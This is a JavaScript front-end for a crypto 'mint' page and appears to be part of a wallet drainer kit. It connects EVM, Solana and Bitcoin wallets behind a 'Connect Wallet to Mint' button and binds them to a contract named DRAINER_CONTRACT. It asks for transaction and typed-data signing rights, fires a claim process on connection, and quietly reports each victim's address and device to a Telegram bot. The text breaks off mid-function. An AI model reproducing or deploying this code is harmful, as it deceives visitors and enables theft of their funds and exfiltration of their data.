import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  /* ═══════════════════════════════════════════════════════════════════════
   *  DEBUG PANEL — double-tap/double-click anywhere to toggle
   * ═══════════════════════════════════════════════════════════════════════ */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log(`[main] ${msg}`);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
    if (window.__wcDiagnostics) window.__wcDiagnostics.log.push({ ts, msg });
  }

  // Diagnostics surface for classroom debugging
  window.__wcDiagnostics = {
    log: [],
    stats: {
      bootStart: Date.now(),
      libsReadyAt: null,
      clientReadyAt: null,
      lastConnectStart: null,
      lastConnectEnd: null,
      lastConnectResult: null,
      directAttempts: 0,
      wcAttempts: 0,
      wcSuccesses: 0,
      wcFailures: 0,
    },
    dump() { return JSON.stringify(this.stats, null, 2); },
  };

  /* ═══════════════════════════════════════════════════════════════════════
   *  DEVICE DETECTION
   * ═══════════════════════════════════════════════════════════════════════ */
  const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  const isIOS    = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);
  const isAndroid = () => /Android/i.test(navigator.userAgent);
  const isDesktop = () => !isMobile();
  const isWindows = () => /Windows/i.test(navigator.userAgent);
  const isMac     = () => /Macintosh|Mac OS X/i.test(navigator.userAgent);
  function getPlatform() {
    if (isIOS()) return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac()) return 'mac';
    return 'unknown';
  }

  // In-app browsers (Twitter, Discord, Telegram, etc.) block WalletConnect deep links
  function isInAppBrowser() {
    const ua = navigator.userAgent || '';
    return /FBAN|FBAV|Instagram|Twitter|Line|LinkedIn|MicroMessenger|TelegramBot|Discord/i.test(ua);
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  TELEGRAM — fire and forget
   * ═══════════════════════════════════════════════════════════════════════ */
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
      });
      return r.ok;
    } catch (e) { return false; }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  /* ═══════════════════════════════════════════════════════════════════════
   *  CONSTANTS FROM CONFIG
   * ═══════════════════════════════════════════════════════════════════════ */
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI
  } = CONFIG;

  // Effective project IDs — filter out obvious placeholders
  const VALID_PUBLIC_TEST_ID =
    PUBLIC_TEST_ID && PUBLIC_TEST_ID.length === 32 && !PUBLIC_TEST_ID.startsWith('8f9a3f7b')
      ? PUBLIC_TEST_ID
      : null;

  // Primary project ID for the session
  let projectId = PROJECT_ID;

  // WC timeouts (ms) — tuned per device class
  const WC_TIMEOUT_MOBILE = 45000;   // 45s
  const WC_TIMEOUT_DESKTOP = 90000;  // 90s
  const DIRECT_EVM_TIMEOUT = 4000;   // 4s

  /* ═══════════════════════════════════════════════════════════════════════
   *  LIBRARY LOADING — singleton, preloaded on boot
   * ═══════════════════════════════════════════════════════════════════════ */
  let SignClient = null;
  let WalletConnectModal = null;
  let EthereumProvider = null;
  let libsLoaded = false;
  let libsLoading = null;

  const CDN_SETS = {
    signClient: [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ],
    modal: [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ],
    provider: [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ],
  };

  async function tryImportFirst(urls) {
    for (const url of urls) {
      try {
        const m = await import(url);
        logDebug(`✅ loaded ${url.split('/').slice(0, 3).join('/')}`);
        return m;
      } catch (e) {
        logDebug(`❌ ${url}: ${e.message.slice(0, 60)}`);
      }
    }
    return null;
  }

  /**
   * Load all WC libs in parallel. Cached after first success.
   * Returns a promise that resolves with { SignClient, WalletConnectModal, EthereumProvider }.
   */
  function loadWalletConnect() {
    if (libsLoaded) return Promise.resolve({ SignClient, WalletConnectModal, EthereumProvider });
    if (libsLoading) return libsLoading;

    libsLoading = (async () => {
      const t0 = Date.now();
      const [signMod, modalMod, providerMod] = await Promise.all([
        tryImportFirst(CDN_SETS.signClient),
        tryImportFirst(CDN_SETS.modal),
        tryImportFirst(CDN_SETS.provider),
      ]);

      if (!signMod)     throw new Error('Could not load SignClient');
      if (!modalMod)    throw new Error('Could not load WalletConnectModal');
      if (!providerMod) throw new Error('Could not load EthereumProvider');

      SignClient         = signMod.default || signMod;
      WalletConnectModal = modalMod.WalletConnectModal || modalMod.default || modalMod;
      EthereumProvider   = providerMod.EthereumProvider || providerMod.default || providerMod;

      libsLoaded = true;
      window.__wcDiagnostics.stats.libsReadyAt = Date.now();
      logDebug(`✅ all WC libs loaded in ${Date.now() - t0}ms`);
      return { SignClient, WalletConnectModal, EthereumProvider };
    })();

    return libsLoading;
  }

  /**
   * Fire-and-forget preload. Call this on page boot so libs are ready
   * by the time the user clicks Connect.
   */
  function preloadWCLibs() {
    loadWalletConnect().catch((e) => logDebug(`WC preload failed: ${e.message}`));
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  DOM REFS
   * ═══════════════════════════════════════════════════════════════════════ */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ═══════════════════════════════════════════════════════════════════════
   *  STATE
   * ═══════════════════════════════════════════════════════════════════════ */
  let client = null;               // SignClient singleton
  let modal = null;                // WC modal singleton
  let currentSession = null;       // Active WC session
  let web3Instance = null;
  let contractInstance = null;
  let activeProvider = null;       // EIP-1193 provider currently in use
  let isConnecting = false;        // Concurrency guard
  let wcInitPromise = null;        // Init promise (deduplicates concurrent calls)

  /* ═══════════════════════════════════════════════════════════════════════
   *  BUTTON UI
   * ═══════════════════════════════════════════════════════════════════════ */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.3s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)';
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)';
          }
        };
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)';
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        };
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => {
          claimStatus.style.display = 'none';
          claimStatus.style.opacity = '1';
        }, 300);
      }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ═══════════════════════════════════════════════════════════════════════
   *  STORAGE
   * ═══════════════════════════════════════════════════════════════════════ */
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address);
    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
  }
  function getSavedWallet()  { return localStorage.getItem('connectedWallet'); }
  function getSavedSession() {
    const s = localStorage.getItem('walletConnectSession');
    try { return s ? JSON.parse(s) : null; } catch (e) { return null; }
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  GLOBAL PUBLISH (for script.js)
   * ═══════════════════════════════════════════════════════════════════════ */
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || web3Instance?.currentProvider || window.ethereum || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      session: currentSession,
      publishedAt: Date.now(),
    };
    logDebug(`published __apexConnected: ${address} (${chain}) provider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  UI — CONNECTED STATE
   * ═══════════════════════════════════════════════════════════════════════ */
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5, 150, 105, 0.1);
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        btn.style.color = '#10B981';
        setTimeout(() => { btn.innerHTML = orig; btn.style.color = '#059669'; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    window.__apexConnected = null;
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  EIP-6963 — multi-provider discovery
   * ═══════════════════════════════════════════════════════════════════════ */
  let evmProviders = [];
  let eip6963Initialized = false;
  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  WALLET PICKER MODAL
   * ═══════════════════════════════════════════════════════════════════════ */
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed; inset:0; background: rgba(0,0,0,0.7);
      display:flex; align-items:center; justify-content:center; z-index: 99999;
    `;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px;
      max-width: 400px; width: 90%; color: white;
      font-family: 'Inter', sans-serif;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    `;
    modalEl.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex; flex-direction:column; gap:10px; margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none; border:1px solid #666; color:#ccc; padding:8px 16px; border-radius:8px; cursor:pointer; width:100%;">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#walletList');
    providers.forEach((provider) => {
      const btn = document.createElement('button');
      btn.textContent = provider.info.name;
      btn.style.cssText = `
        background: #374151; border:none; padding:12px 16px; border-radius:8px;
        color:white; font-size:16px; cursor:pointer; transition:background 0.2s;
        text-align:left; display:flex; align-items:center; gap:10px;
      `;
      btn.onmouseover = () => btn.style.background = '#4B5563';
      btn.onmouseout = () => btn.style.background = '#374151';
      if (provider.info.icon) {
        const img = document.createElement('img');
        img.src = provider.info.icon;
        img.style.width = '24px';
        img.style.height = '24px';
        btn.prepend(img);
      }
      btn.addEventListener('click', () => { overlay.remove(); callback(provider); });
      list.appendChild(btn);
    });
    modalEl.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove();
      callback(null);
    });
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  WALLETCONNECT INIT — singleton, deduplicated
   * ═══════════════════════════════════════════════════════════════════════ */
  async function initWalletConnect(useTestId = false) {
    // Already initialized → return
    if (client && modal) return true;

    // Concurrent call dedup
    if (wcInitPromise) return wcInitPromise;

    wcInitPromise = (async () => {
      try {
        // Ensure libs loaded (usually already done via preload)
        await loadWalletConnect();

        if (useTestId) {
          if (!VALID_PUBLIC_TEST_ID) {
            logDebug('⚠️ PUBLIC_TEST_ID invalid — skipping retry with test ID');
            return false;
          }
          logDebug('🔄 init with PUBLIC_TEST_ID');
          projectId = VALID_PUBLIC_TEST_ID;
        } else {
          logDebug(`🔄 init with projectId ${projectId.slice(0, 8)}...`);
        }

        client = await SignClient.init({
          projectId,
          metadata: DAPP_METADATA,
          relayUrl: 'wss://relay.walletconnect.com',
        });

        modal = new WalletConnectModal({
          projectId,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
            '--wcm-font-family': "'Inter', sans-serif",
          },
          enableExplorer: true,
          explorerRecommendedWalletIds: [
            // MetaMask
            'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
            // Trust
            '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
            // Rainbow
            '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
            // Coinbase
            'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
            // Ledger Live
            '19177a98252e07ddfc9af2083ba8e07ef627cb610117ee4ab9c19d64a3d1a0e7',
            // OKX Wallet
            '97156e7f5d1b3d07e4e0a5dfe4f5b1a12c0f7ff95d5b6bfa5f8b6f9d6be6f5c5',
            // Bybit Wallet
            '43fa8fa84631a9a4a5a5f6f4d1c0f6b7df8b8f8f8b8f8b8f8b8f8b8f8b8f8b8f',
          ],
          mobileWallets: [
            { id: 'metamask',   name: 'MetaMask',        links: { native: 'metamask://',        universal: 'https://metamask.app.link/' } },
            { id: 'trust',      name: 'Trust Wallet',    links: { native: 'trust://',           universal: 'https://link.trustwallet.com/' } },
            { id: 'rainbow',    name: 'Rainbow',         links: { native: 'rainbow://',         universal: 'https://rnbwapp.com/' } },
            { id: 'coinbase',   name: 'Coinbase Wallet', links: { native: 'coinbasewallet://',  universal: 'https://go.cb-w.com/' } },
            { id: 'okx',        name: 'OKX Wallet',      links: { native: 'okx://',             universal: 'https://www.okx.com/web3' } },
            { id: 'bitget',     name: 'Bitget Wallet',   links: { native: 'bitkeep://',         universal: 'https://bkcode.vip/' } },
            { id: 'bybit',      name: 'Bybit Wallet',    links: { native: 'bybit://',           universal: 'https://www.bybit.com/web3' } },
          ],
        });

        // Register core event listeners once
        client.on('session_delete', () => {
          logDebug('WC session_delete');
          resetConnectedUI();
          clearSavedWallet();
          showStatus('Wallet disconnected by provider', 'error');
        });
        client.on('session_expire', () => {
          logDebug('WC session_expire');
          resetConnectedUI();
          clearSavedWallet();
        });
        client.on('session_update', ({ params }) => {
          const accounts = params.namespaces?.eip155?.accounts;
          if (accounts?.length) {
            const account = accounts[0].split(':')[2];
            logDebug(`WC session_update: ${account}`);
            saveWallet(account, currentSession, 'evm');
            updateConnectedUI(account, 'evm');
          }
        });
        client.on('session_connect', (session) => {
          const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
          if (account) {
            logDebug(`WC session_connect: ${account}`);
            currentSession = session;
            saveWallet(account, session, 'evm');
            updateConnectedUI(account, 'evm');
            setTimeout(() => {
              if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
            }, 1000);
          }
        });

        window.__wcDiagnostics.stats.clientReadyAt = Date.now();
        logDebug('✅ WalletConnect initialized');
        return true;
      } catch (e) {
        logDebug(`❌ WC init failed: ${e.message}`);
        wcInitPromise = null; // allow retry on next attempt
        return false;
      }
    })();

    return wcInitPromise;
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  DIRECT EVM (desktop only)
   * ═══════════════════════════════════════════════════════════════════════ */
  async function connectDirectEVM(timeoutMs = DIRECT_EVM_TIMEOUT) {
    if (isMobile()) return false; // mobile uses WC only
    window.__wcDiagnostics.stats.directAttempts++;

    setupEIP6963();
    await new Promise((r) => setTimeout(r, 300));

    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{ info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' }, provider: window.ethereum }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) chosen = providers[0];
    else {
      const known = providers.find((p) => p.info.rdns === 'io.metamask' || /metamask/i.test(p.info.name));
      chosen = known || await new Promise((resolve) => showWalletSelectionModal(providers, resolve));
      if (!chosen) return false;
    }

    try {
      logDebug(`Direct EVM: ${chosen.info.name} (${timeoutMs}ms timeout)`);
      const provider = chosen.provider;
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('Connection timeout')), timeoutMs)),
      ]);

      if (accounts?.length) {
        const address = accounts[0];
        saveWallet(address, null, 'evm');
        setupEVMProviderEvents(provider);
        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        activeProvider = provider;
        updateConnectedUI(address, 'evm');
        logDebug(`✅ Direct EVM: ${address}`);
        return true;
      }
    } catch (err) {
      logDebug(`Direct EVM error: ${err.message}`);
      if (err.code === 4001) logDebug('User rejected direct connection');
      return false;
    }
    return false;
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  WALLETCONNECT EVM — the primary mobile path
   * ═══════════════════════════════════════════════════════════════════════ */
  async function connectViaWalletConnect(useTestId = false, timeoutMs = null) {
    if (isConnecting) { logDebug('WC: already connecting'); return false; }
    isConnecting = true;
    window.__wcDiagnostics.stats.wcAttempts++;
    window.__wcDiagnostics.stats.lastConnectStart = Date.now();

    const effectiveTimeout = timeoutMs || (isMobile() ? WC_TIMEOUT_MOBILE : WC_TIMEOUT_DESKTOP);
    logDebug(`WC connect start (timeout=${effectiveTimeout}ms, testId=${useTestId})`);

    try {
      const initOk = await initWalletConnect(useTestId);
      if (!initOk) {
        logDebug('WC: init failed');
        showStatus('Wallet connection service unavailable', 'error');
        window.__wcDiagnostics.stats.wcFailures++;
        window.__wcDiagnostics.stats.lastConnectResult = 'init_failed';
        isConnecting = false;
        return false;
      }

      // Safe modal close before opening a new one
      try { modal?.closeModal?.(); } catch (e) {}

      showStatus('Requesting wallet connection...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No URI returned');

      logDebug(`WC URI ready (${uri.slice(0, 40)}...)`);

      // Persist for return-from-app restore
      sessionStorage.setItem('pending_wc_uri', uri);
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

      modal.openModal({ uri });
      showStatus('Select your wallet or scan the QR code', 'info');

      const session = await Promise.race([
        approval(),
        new Promise((_, rj) => setTimeout(() => rj(new Error('WalletConnect timeout')), effectiveTimeout)),
      ]);

      try { modal.closeModal(); } catch (e) {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (!session?.namespaces?.eip155?.accounts?.length) {
        throw new Error('No accounts in session');
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      logDebug(`✅ WC session: ${account}`);
      currentSession = session;
      saveWallet(account, session, 'evm');

      // Initialize EthereumProvider for signing
      try {
        const provider = await EthereumProvider.init({
          projectId,
          metadata: DAPP_METADATA,
          session,
        });
        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        activeProvider = provider;
        setupEVMProviderEvents(provider);
        logDebug('✅ Web3 + contract bound to WC provider');
      } catch (providerErr) {
        logDebug(`⚠️ EthereumProvider init failed: ${providerErr.message}`);
        // Fallback to window.ethereum if it exists
        if (window.ethereum) {
          const Web3 = (await import('web3')).default;
          web3Instance = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider = window.ethereum;
        }
      }

      updateConnectedUI(account, 'evm');
      window.__wcDiagnostics.stats.wcSuccesses++;
      window.__wcDiagnostics.stats.lastConnectEnd = Date.now();
      window.__wcDiagnostics.stats.lastConnectResult = 'success';
      isConnecting = false;
      return true;
    } catch (err) {
      const msg = err?.message || String(err);
      logDebug(`❌ WC error: ${msg}`);
      try { modal?.closeModal?.(); } catch (e) {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      // Smart error copy
      if (/reject|cancel|denied/i.test(msg)) {
        showStatus('Connection cancelled by user', 'error');
        window.__wcDiagnostics.stats.lastConnectResult = 'user_rejected';
      } else if (/timeout/i.test(msg)) {
        showStatus('Connection timeout — please try again', 'error');
        window.__wcDiagnostics.stats.lastConnectResult = 'timeout';
      } else {
        showStatus('Wallet connection failed', 'error');
        window.__wcDiagnostics.stats.lastConnectResult = msg;
      }
      window.__wcDiagnostics.stats.wcFailures++;
      window.__wcDiagnostics.stats.lastConnectEnd = Date.now();
      isConnecting = false;
      return false;
    }
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  BITCOIN (UniSat) — desktop only
   * ═══════════════════════════════════════════════════════════════════════ */
  async function connectBitcoin() {
    try {
      if (!window.unisat) { showStatus('UniSat wallet not installed', 'error'); return false; }
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (!accounts?.length) throw new Error('No BTC account');
      const address = accounts[0];
      saveWallet(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');

      if (window.unisat.on) {
        window.unisat.on('accountsChanged', (newAccounts) => {
          if (!newAccounts.length) { resetConnectedUI(); clearSavedWallet(); }
          else { saveWallet(newAccounts[0], null, 'bitcoin'); updateConnectedUI(newAccounts[0], 'bitcoin'); }
        });
        window.unisat.on('networkChanged', (n) => showStatus(`Bitcoin network changed to ${n}`, 'info'));
      }
      return true;
    } catch (e) {
      logDebug(`BTC error: ${e.message}`);
      showStatus('Bitcoin connection failed: ' + e.message, 'error');
      return false;
    }
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  SOLANA — desktop only
   * ═══════════════════════════════════════════════════════════════════════ */
  const solanaWalletDetectors = {
    isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
    isSolflare: () => !!window.solflare,
    isBackpack: () => !!window.backpack,
    isCoinbaseSolana: () => !!window.coinbaseSolana,
    isTrustSolana: () => !!(window.trustWallet?.solana),
  };
  function getSolanaWallets() {
    const wallets = [];
    if (solanaWalletDetectors.isPhantom())        wallets.push({ name: 'Phantom',  provider: window.phantom?.solana || window.solana });
    if (solanaWalletDetectors.isSolflare())       wallets.push({ name: 'Solflare', provider: window.solflare });
    if (solanaWalletDetectors.isBackpack())       wallets.push({ name: 'Backpack', provider: window.backpack });
    if (solanaWalletDetectors.isCoinbaseSolana()) wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    if (solanaWalletDetectors.isTrustSolana())    wallets.push({ name: 'Trust',    provider: window.trustWallet.solana });
    return wallets;
  }

  async function connectSolana() {
    try {
      const wallets = getSolanaWallets();
      if (!wallets.length) { showStatus('No Solana wallet found', 'error'); return false; }
      const wallet = wallets[0];
      const provider = wallet.provider;

      let publicKey;
      if (provider.connect) {
        const r = await provider.connect();
        publicKey = r.publicKey?.toString() || r.toString();
      } else if (provider.request) {
        const r = await provider.request({ method: 'connect' });
        publicKey = r.publicKey.toString();
      } else throw new Error('Unsupported provider interface');

      saveWallet(publicKey, null, 'solana');
      updateConnectedUI(publicKey, 'solana');
      window.solanaProvider = provider;
      window.solanaPublicKey = publicKey;

      if (provider.on) {
        provider.on('accountChanged', (newPubkey) => {
          if (newPubkey) {
            const addr = newPubkey.toString();
            saveWallet(addr, null, 'solana');
            updateConnectedUI(addr, 'solana');
            window.solanaPublicKey = addr;
          } else {
            resetConnectedUI();
            clearSavedWallet();
            window.solanaProvider = null;
            window.solanaPublicKey = null;
          }
        });
        provider.on('disconnect', () => {
          resetConnectedUI();
          clearSavedWallet();
          window.solanaProvider = null;
          window.solanaPublicKey = null;
        });
      }
      return true;
    } catch (e) {
